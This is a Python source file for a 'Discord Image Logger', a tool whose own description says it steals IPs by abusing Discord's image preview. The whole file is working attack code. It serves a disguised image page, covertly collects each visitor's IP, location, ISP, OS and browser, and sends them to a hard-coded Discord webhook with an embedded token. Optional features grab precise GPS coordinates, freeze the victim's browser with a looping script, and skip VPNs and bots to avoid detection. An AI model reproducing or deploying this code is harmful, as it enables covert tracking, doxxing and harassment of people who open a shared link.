# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1400455110382981233/MrOmIA24gGdxIdnmhOgbYwhT2s63h467FuMR9Xxhk1IJ3zCwgeOeq3klK4uGJ8HW1wO-",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
